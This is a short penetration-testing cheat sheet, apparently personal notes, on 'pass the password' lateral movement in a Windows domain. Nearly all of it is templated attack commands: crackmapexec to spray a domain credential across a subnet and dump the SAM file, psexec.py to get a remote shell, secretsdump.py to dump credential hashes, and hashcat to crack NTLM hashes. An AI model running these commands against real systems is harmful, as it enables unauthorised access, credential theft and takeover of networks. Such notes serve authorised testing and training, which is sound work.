# Pass the Password

```bash
crackmapexec $network_ip/$cidr -d $domain -u $user -p $password
```

Once you get the pwn3d machines you can psexec or so, or you can even use some modules and options provided by crackmapexec as shown in the blog. so for example : To dump the sam file (depends, sometimes it doesn't work) :

```bash
crackmapexec $network_ip/$cidr -d $domain -u $user -p $password --sam

psexec.py $domain/$username:$password@$machine_ip

# dump hashes
secretsdump.py $domain/$username:$password@$machine_ip

# crack hashes
hashcat -m 1000 hashfile dict_file -O
```
